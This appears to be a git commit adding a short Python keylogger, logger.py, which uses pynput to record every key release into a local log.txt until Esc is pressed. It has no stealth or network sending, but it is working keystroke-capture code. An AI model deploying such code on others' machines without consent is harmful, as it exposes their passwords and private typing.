46d89b3a0fe6df53210d5212ed22d72f6f2303fd
R, Alex <alex.richardson19@imperial.ac.uk>
2021-08-05 21:48:44 +0100

    Initial commit

---
+++ logger.py
@@ -0,0 +1,27 @@
+from pynput.keyboard import Key, Controller, Listener
+
+keyboard = Controller()
+# write for easy debugging
+f = open("log.txt", "w")
+
+
+def on_release(key):
+    # print(f"Key {key} pressed")
+    if key == Key.space:
+        key = " "
+    elif key == Key.enter:
+        key = "[ENTER]\n"
+    elif key == Key.esc:
+        # stop listener
+        return False
+    f.write(str(key).replace("'", ""))
+
+
+def main():
+    # collect events until released
+    with Listener(on_release=on_release) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    main()
